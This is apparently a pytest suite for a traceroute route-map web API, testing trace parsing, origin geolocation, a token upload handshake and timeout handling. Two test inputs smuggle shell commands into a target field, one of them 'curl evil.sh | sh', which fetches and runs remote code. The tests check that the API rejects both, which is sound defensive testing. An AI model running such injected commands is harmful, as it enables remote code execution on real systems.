"""The Route Map HTTP surface, driven through the real app.

Covers the things that are only true at the route level: the size cap on an
unauthenticated upload, the origin pre-fill from the visitor's IP under the
existing trusted-proxy logic, and the shape the frontend and the MCP tool both
depend on.
"""
import asyncio
import os
import pathlib
import time

import pytest

os.environ.setdefault("FALCONEYE_DB", "/tmp/falconeye_test.db")

from fastapi.testclient import TestClient

from app.config import ROUTEMAP_MAX_UPLOAD_BYTES
from app.main import app
from app.routemap import atlas, geo, hoiho, tokens

FIXTURES = pathlib.Path(__file__).resolve().parents[1] / "fixtures" / "routemap"
MANILA = {"origin_lat": 14.6, "origin_lon": 121.0}


@pytest.fixture
def client():
    """Context-managed on purpose.

    A bare TestClient(app) starts and tears down an event-loop portal around
    each individual request, so a background task created by one request is
    cancelled before the next one can observe it. Under uvicorn the loop is the
    server's and outlives any request; entering the context here gives the test
    the same property instead of a harness artefact that looks like a bug.
    """
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture(autouse=True)
def fresh_limits():
    """Start every test with the per-IP daily counters empty.

    The limiter writes to the shared test database, so without this the suite
    passes or fails depending on how many times it has been run today: the
    thirty-first token request of the day is refused, correctly, and the test
    that asked for it looks broken. Clearing the rows is the isolation; the
    limiter itself is exercised by its own tests.
    """
    import sqlite3

    from app.config import DB_PATH

    conn = sqlite3.connect(DB_PATH)
    try:
        for table in ("routemap_analyze_rl", "routemap_token_rl", "routemap_atlas_rl"):
            try:
                conn.execute(f"DELETE FROM {table}")
            except sqlite3.OperationalError:
                pass  # the table is created on first use
        conn.commit()
    finally:
        conn.close()


@pytest.fixture(autouse=True)
def offline(monkeypatch):
    """No test here talks to CAIDA, RIPEstat or RIPE Atlas."""
    async def no_hoiho(hostnames):
        return {}, None

    async def no_ip(addresses):
        return {}

    monkeypatch.setattr(hoiho, "lookup", no_hoiho)
    monkeypatch.setattr(geo, "ip_geolocate", no_ip)
    monkeypatch.setattr(tokens, "_redis", None)
    tokens._local.clear()


# ---------- capabilities ----------

def test_capabilities_says_what_this_instance_can_do(client):
    body = client.get("/api/routemap/capabilities").json()
    assert set(body) >= {"atlas_enabled", "hoiho_enabled", "upload_enabled",
                         "site_code_count", "token_ttl_seconds"}
    assert isinstance(body["atlas_enabled"], bool)
    assert body["site_code_count"] > 0


# ---------- analyze ----------

def test_a_pasted_trace_comes_back_as_located_hops(client):
    text = (FIXTURES / "heise_traceroute.txt").read_text()
    body = client.post("/api/routemap/analyze",
                       json={"trace_text": text, **MANILA}).json()
    assert body["parser"] == "traceroute"
    assert body["parser_label"] == "Unix traceroute"
    assert len(body["hops"]) == 16
    assert body["origin"]["lat"] == 14.6
    # The city label comes from the bundled list, not from a service.
    assert body["origin"]["label"].startswith("Manila")
    # The Arelion legs are placed by the carrier site-code table even with
    # Hoiho and the IP database switched off entirely.
    places = {h["hop"]: h["place"] for h in body["hops"]}
    assert "Hong Kong" in (places[6] or "")
    assert "Singapore" in (places[7] or "")
    assert "Marseille" in (places[8] or "")
    assert "Paris" in (places[9] or "")
    assert "Frankfurt" in (places[10] or "")
    assert all(h["source"] == "site-code" for h in body["hops"] if h["hop"] in (6, 7, 8, 9, 10))


def test_every_hop_carries_the_fields_the_table_renders(client):
    text = (FIXTURES / "amazon_mtr.txt").read_text()
    body = client.post("/api/routemap/analyze",
                       json={"trace_text": text, **MANILA}).json()
    for hop in body["hops"]:
        for field in ("hop", "address", "hostname", "min_rtt_ms", "loss_pct",
                      "place", "source", "annotations"):
            assert field in hop, f"hop {hop['hop']} is missing {field}"
        assert hop["source"] in ("hoiho", "site-code", "ip-db", "local", "unresolved")


def test_an_unlocated_hop_says_why(client):
    text = (FIXTURES / "amazon_traceroute.txt").read_text()
    body = client.post("/api/routemap/analyze",
                       json={"trace_text": text, **MANILA}).json()
    unlocated = [h for h in body["hops"] if h["lat"] is None]
    assert unlocated, "the amazon fixture has hops that cannot be placed"
    for hop in unlocated:
        assert hop["reason"], f"hop {hop['hop']} was dropped with no reason given"


def test_an_unreadable_paste_is_a_400_not_a_500(client):
    response = client.post("/api/routemap/analyze",
                           json={"trace_text": "hello world", **MANILA})
    assert response.status_code == 400
    assert "traceroute" in response.json()["detail"].lower()


def test_an_out_of_range_origin_is_ignored_rather_than_fatal(client):
    text = (FIXTURES / "heise_traceroute.txt").read_text()
    response = client.post("/api/routemap/analyze", json={
        "trace_text": text, "origin_lat": 999.0, "origin_lon": -999.0})
    assert response.status_code == 200
    # No usable origin, so the anchor falls back to the first located hop and
    # says so rather than pretending the bad coordinates were used.
    assert response.json()["origin"]["source"] in ("first-hop", "none")


# ---------- cities ----------

def test_city_search_is_offline_and_attributed(client):
    body = client.get("/api/routemap/cities", params={"q": "manila"}).json()
    assert body["results"], "the bundled city list returned nothing for Manila"
    assert body["results"][0]["display"].startswith("Manila")
    assert "GeoNames" in body["attribution"]


def test_a_too_short_query_returns_nothing_rather_than_everything(client):
    assert client.get("/api/routemap/cities", params={"q": "m"}).json()["results"] == []


# ---------- origin guess ----------

def test_the_picker_prefill_comes_from_the_visitors_own_ip(client, monkeypatch):
    """Uses the same CF-Connecting-IP logic every rate limit uses.

    The header is only honoured when the TCP peer is a trusted proxy, so the
    test has to present itself as one. That guard is the reason this endpoint
    cannot be made to geolocate an arbitrary address of the caller's choosing.
    """
    seen = {}

    async def fake_geo(addresses):
        seen["addresses"] = list(addresses)
        return {addresses[0]: {"lat": 14.58, "lon": 120.97,
                               "city": "Manila", "cc": "PH"}}

    monkeypatch.setattr(geo, "ip_geolocate", fake_geo)
    monkeypatch.setattr("app.utils.client_ip.is_trusted_proxy", lambda peer: True)
    # TestClient's default peer is the literal string "testclient", which is not
    # an address, so the trust check would short-circuit before the header is
    # even considered. Present a real one.
    fronted = TestClient(app, client=("173.245.48.1", 44321))
    body = fronted.get("/api/routemap/origin-guess",
                       headers={"CF-Connecting-IP": "203.0.113.46"}).json()

    assert seen["addresses"] == ["203.0.113.46"], (
        "the guess was made for the wrong address; CF-Connecting-IP was not honoured")
    assert body["available"] is True
    # Rounded to about 10 km before it is offered.
    assert body["lat"] == 14.6 and body["lon"] == 121.0
    assert body["display"].startswith("Manila")


def test_the_prefill_degrades_quietly_when_the_address_cannot_be_placed(client):
    body = client.get("/api/routemap/origin-guess",
                      headers={"CF-Connecting-IP": "203.0.113.46"}).json()
    assert body["available"] is False


# ---------- the run-it-yourself handshake ----------

def test_a_command_is_issued_for_a_valid_target(client):
    body = client.post("/api/routemap/command", json={"target": "heise.de"}).json()
    assert len(body["token"]) == 64
    assert body["poll_key"] != body["token"]
    assert {c["key"] for c in body["commands"]} == {"windows", "unix", "mtr", "mtr_macos"}
    for command in body["commands"]:
        assert body["token"] in command["command"]
        assert "/api/routemap/ingest/" in command["command"]


def test_a_shell_injection_target_is_refused_before_a_token_exists(client):
    response = client.post("/api/routemap/command",
                           json={"target": "heise.de; curl evil.sh | sh"})
    assert response.status_code == 400


def _poll_until_done(client, token, key, tries=60):
    """Poll a job the way the page does, and return the terminal response.

    Every poll must be a fast status read: the analysis happens in a background
    job, not here. A poll that blocks is the v3.35.0 bug.
    """
    for _ in range(tries):
        response = client.get(f"/api/routemap/pending/{token}", params={"key": key})
        assert response.status_code == 200, response.text
        body = response.json()
        if body.get("status") in ("ready", "error", "expired"):
            return body
        time.sleep(0.1)
    raise AssertionError("the job never reached a terminal state")


def test_an_upload_is_analysed_once_in_the_background_and_handed_over_once(client):
    issued = client.post("/api/routemap/command",
                         json={"target": "heise.de", **MANILA}).json()
    text = (FIXTURES / "heise_traceroute.txt").read_text()

    waiting = client.get(f"/api/routemap/pending/{issued['token']}",
                         params={"key": issued["poll_key"]}).json()
    assert waiting["status"] == "waiting"

    upload = client.post(f"/api/routemap/ingest/{issued['token']}",
                         content=text.encode(),
                         headers={"Content-Type": "text/plain"})
    assert upload.status_code == 200

    body = _poll_until_done(client, issued["token"], issued["poll_key"])
    assert body["status"] == "ready"
    assert body["source"] == "upload"
    assert len(body["hops"]) == 16
    # The origin recorded when the command was minted was used, even though the
    # shell that uploaded the trace knew nothing about it.
    assert body["origin"]["label"].startswith("Manila")

    gone = client.get(f"/api/routemap/pending/{issued['token']}",
                      params={"key": issued["poll_key"]}).json()
    assert gone["status"] == "expired", "the result was kept after being handed over"


def test_polling_without_the_poll_key_is_refused(client):
    issued = client.post("/api/routemap/command", json={"target": "heise.de"}).json()
    client.post(f"/api/routemap/ingest/{issued['token']}", content=b"trace\n")
    response = client.get(f"/api/routemap/pending/{issued['token']}",
                          params={"key": "wrong"})
    assert response.status_code == 403


def test_an_oversized_upload_is_refused(client):
    issued = client.post("/api/routemap/command", json={"target": "heise.de"}).json()
    oversized = b"x" * (ROUTEMAP_MAX_UPLOAD_BYTES + 1024)
    response = client.post(f"/api/routemap/ingest/{issued['token']}",
                           content=oversized,
                           headers={"Content-Type": "text/plain"})
    assert response.status_code == 413


def test_an_empty_upload_is_refused(client):
    issued = client.post("/api/routemap/command", json={"target": "heise.de"}).json()
    response = client.post(f"/api/routemap/ingest/{issued['token']}", content=b"   ")
    assert response.status_code == 400


def test_uploading_to_an_unknown_token_is_a_404(client):
    response = client.post("/api/routemap/ingest/" + "a" * 64, content=b"trace\n")
    assert response.status_code == 404


# ---------- Atlas ----------

def test_atlas_off_is_a_503_with_a_kind_the_tab_can_act_on(client, monkeypatch):
    monkeypatch.setattr(atlas, "configured", lambda: False)
    response = client.post("/api/routemap/trace",
                           json={"target": "heise.de", **MANILA})
    assert response.status_code == 503
    assert response.json()["detail"]["kind"] == "disabled"


def test_an_invalid_atlas_target_is_rejected_before_anything_is_spent(client, monkeypatch):
    called = {"n": 0}

    async def should_not_run(*args, **kwargs):
        called["n"] += 1
        raise AssertionError("a measurement was created for an invalid target")

    monkeypatch.setattr(atlas, "configured", lambda: True)
    monkeypatch.setattr(atlas, "start", should_not_run)
    response = client.post("/api/routemap/trace",
                           json={"target": "heise.de && id", **MANILA})
    assert response.status_code == 400
    assert called["n"] == 0


def test_a_spoofed_header_from_an_untrusted_peer_is_not_honoured(client, monkeypatch):
    """Otherwise the endpoint geolocates any address the caller names."""
    seen = {}

    async def fake_geo(addresses):
        seen["addresses"] = list(addresses)
        return {}

    monkeypatch.setattr(geo, "ip_geolocate", fake_geo)
    monkeypatch.setattr("app.utils.client_ip.is_trusted_proxy", lambda peer: False)
    direct = TestClient(app, client=("198.51.100.7", 44321))
    direct.get("/api/routemap/origin-guess",
               headers={"CF-Connecting-IP": "8.8.8.8"})
    assert seen.get("addresses") != ["8.8.8.8"], (
        "a spoofed CF-Connecting-IP from an untrusted peer was geolocated")


def test_an_unreachable_upload_store_is_a_503_not_a_500(client, monkeypatch):
    """Found by running the handshake end to end with Redis stopped.

    The store raised a raw ConnectionError straight out of the route, so the
    user got "Internal Server Error" for an operational condition that has an
    obvious workaround. It now says what happened and what still works.
    """
    async def refuse(*args, **kwargs):
        raise tokens.StoreUnavailable("Connection refused")

    monkeypatch.setattr(tokens, "issue", refuse)
    response = client.post("/api/routemap/command", json={"target": "heise.de"})
    assert response.status_code == 503
    assert "paste" in response.json()["detail"].lower()


def test_capabilities_reports_an_unreachable_store_as_upload_disabled(client, monkeypatch):
    """"Redis is importable" is not the same claim as "Redis answers"."""
    async def unhealthy():
        return False

    monkeypatch.setattr(tokens, "healthy", unhealthy)
    monkeypatch.setattr(tokens, "store_kind", lambda: "unavailable")
    body = client.get("/api/routemap/capabilities").json()
    assert body["upload_enabled"] is False
    assert body["upload_store"] == "unavailable"


def test_an_unidentifiable_visitor_falls_back_to_the_country_of_their_origin(
        client, monkeypatch):
    """Found running the first live trace: a request whose address yields no
    ASN (a local caller, a visitor behind something that hides it) gave up with
    "no probe near you", while the origin they had already supplied narrowed it
    perfectly well. Resolving a country from those coordinates is a lookup in
    the bundled city table, so it costs no request and tells nobody anything.
    """
    seen = {}

    async def no_network(client_ip):
        return None, None

    async def fake_start(target, asn, country, origin, af=4):
        seen.update(asn=asn, country=country)
        raise atlas.AtlasUnavailable("noprobe", "none")

    monkeypatch.setattr(atlas, "configured", lambda: True)
    monkeypatch.setattr("app.routemap.routes._client_network", no_network)
    monkeypatch.setattr(atlas, "start", fake_start)

    client.post("/api/routemap/trace", json={"target": "heise.de", **MANILA})
    assert seen["country"] == "PH", (
        "the Manila origin did not yield a country for probe selection")


def test_a_trace_completes_even_when_every_external_source_hangs(client, monkeypatch):
    """The v3.35.0 502, as a test.

    A poll ran the whole geolocation pipeline inline. Hoiho, the IP database
    and PTR between them can take longer than nginx (90s) and gunicorn (90s)
    will hold a request open, and a worker killed mid-request takes every other
    request on it down too, which is how a poll for an upload that had already
    succeeded came back 502.

    Two properties are asserted here, and both have to hold:
      1. every poll answers 200 promptly, because it is a status read
      2. the job still finishes, with the hops no source could place marked
         unresolved rather than the whole trace failing
    """
    async def hangs_forever(*args, **kwargs):
        await asyncio.sleep(3600)

    monkeypatch.setattr(hoiho, "lookup", hangs_forever)
    monkeypatch.setattr(geo, "ip_geolocate", hangs_forever)
    monkeypatch.setattr(geo, "reverse_dns", hangs_forever)
    # The real budgets are 12 to 20 seconds; the behaviour under test is that
    # a budget exists and is enforced, not its production value.
    monkeypatch.setattr(geo, "HOIHO_BUDGET_SECONDS", 0.3)
    monkeypatch.setattr(geo, "IP_DB_BUDGET_SECONDS", 0.3)
    monkeypatch.setattr(geo, "REVERSE_DNS_BUDGET_SECONDS", 0.3)

    # A full 30-hop trace of public addresses, so every source would be asked.
    lines = ["traceroute to example.net (203.0.113.1), 30 hops max, 60 byte packets"]
    for hop in range(1, 31):
        lines.append(f"{hop:>2}  62.115.{hop}.1 (62.115.{hop}.1)  {hop * 5}.000 ms")
    trace = "\n".join(lines) + "\n"

    issued = client.post("/api/routemap/command",
                         json={"target": "example.net", **MANILA}).json()
    upload = client.post(f"/api/routemap/ingest/{issued['token']}",
                         content=trace.encode(),
                         headers={"Content-Type": "text/plain"})
    assert upload.status_code == 200

    started = time.time()
    body = _poll_until_done(client, issued["token"], issued["poll_key"], tries=50)
    elapsed = time.time() - started

    assert body["status"] == "ready", f"the job did not finish: {body}"
    assert elapsed < 5.0, (
        f"the job took {elapsed:.1f}s with every source hung; the per-source "
        f"budgets are not bounding it")
    assert len(body["hops"]) == 30
    # No source answered, so nothing is placed, and every hop says why.
    assert all(h["source"] == "unresolved" for h in body["hops"])
    assert all(h["reason"] for h in body["hops"])


def test_every_poll_is_a_status_read_and_never_runs_the_pipeline(client, monkeypatch):
    """Structural guard on the fix: polling must not reach a source."""
    touched = []

    async def record_hoiho(*args, **kwargs):
        touched.append("hoiho")
        return {}, None

    async def record_ip(*args, **kwargs):
        touched.append("ip-db")
        return {}

    issued = client.post("/api/routemap/command",
                         json={"target": "heise.de", **MANILA}).json()
    # Poll before anything is uploaded: there is no work, so no source is asked.
    monkeypatch.setattr(hoiho, "lookup", record_hoiho)
    monkeypatch.setattr(geo, "ip_geolocate", record_ip)
    for _ in range(3):
        response = client.get(f"/api/routemap/pending/{issued['token']}",
                              params={"key": issued["poll_key"]})
        assert response.status_code == 200
        assert response.json()["status"] == "waiting"
    assert touched == [], f"a poll reached an external source: {touched}"


def test_an_atlas_trace_returns_a_job_immediately_rather_than_blocking(client, monkeypatch):
    """POST /trace used to block for the whole measurement, up to two minutes,
    which is longer than nginx and gunicorn allow."""
    async def fake_start(target, asn, country, origin, af=4):
        return {"probe": {"id": 1018040, "asn": 9299, "country": None,
                          "lat": 14.55, "lon": 121.03, "distance_km": 5.2},
                "measurement_id": 999}

    async def never_returns(measurement_id):
        await asyncio.sleep(3600)

    monkeypatch.setattr(atlas, "configured", lambda: True)
    monkeypatch.setattr(atlas, "start", fake_start)
    monkeypatch.setattr(atlas, "collect_result", never_returns)

    started = time.time()
    response = client.post("/api/routemap/trace",
                           json={"target": "heise.de", **MANILA})
    elapsed = time.time() - started

    assert response.status_code == 202, response.text
    assert elapsed < 5.0, f"POST /trace blocked for {elapsed:.1f}s"
    body = response.json()
    assert body["status"] == "running"
    assert body["token"] and body["poll_key"]
    assert body["probe"]["id"] == 1018040
    # And the page can poll it straight away without waiting on the measurement.
    poll = client.get(f"/api/routemap/pending/{body['token']}",
                      params={"key": body["poll_key"]})
    assert poll.status_code == 200
    assert poll.json()["status"] in ("waiting", "processing")


# ---------- an upload that is not a trace ----------

def test_an_unreadable_upload_reports_what_was_received(client):
    """A real upload from a Mac: mtr without root printed an error, the error
    was uploaded, and the page said "The Atlas measurement did not complete"
    for a trace that never went near Atlas. The job now says it was an upload
    and hands back the first lines so the page can show the actual error."""
    issued = client.post("/api/routemap/command", json={"target": "heise.de"}).json()
    text = ("mtr-packet: Failure to open IPv4 sockets: Permission denied\n"
            "mtr: Failure to start mtr-packet: Invalid argument\n"
            "line three\nline four\n")
    upload = client.post(f"/api/routemap/ingest/{issued['token']}",
                         content=text.encode(),
                         headers={"Content-Type": "text/plain"})
    assert upload.status_code == 200

    body = _poll_until_done(client, issued["token"], issued["poll_key"])
    assert body["status"] == "error"
    assert body["kind"] == "parse"
    assert body["source"] == "upload"
    assert body["received"] == [
        "mtr-packet: Failure to open IPv4 sockets: Permission denied",
        "mtr: Failure to start mtr-packet: Invalid argument",
        "line three",
    ]
    assert "Supported:" in body["message"], "the supported-formats line was lost"


def test_a_command_response_carries_the_macos_note(client):
    body = client.post("/api/routemap/command", json={"target": "heise.de"},
                       headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0)"}).json()
    by_key = {c["key"]: c for c in body["commands"]}
    assert by_key["mtr_macos"]["command"].startswith("sudo mtr ")
    assert "password" in by_key["mtr_macos"]["note"]
    assert not by_key["mtr"]["command"].startswith("sudo")
    # The default tab still comes from the User-Agent, as before.
    assert body["platform"] == "unix"
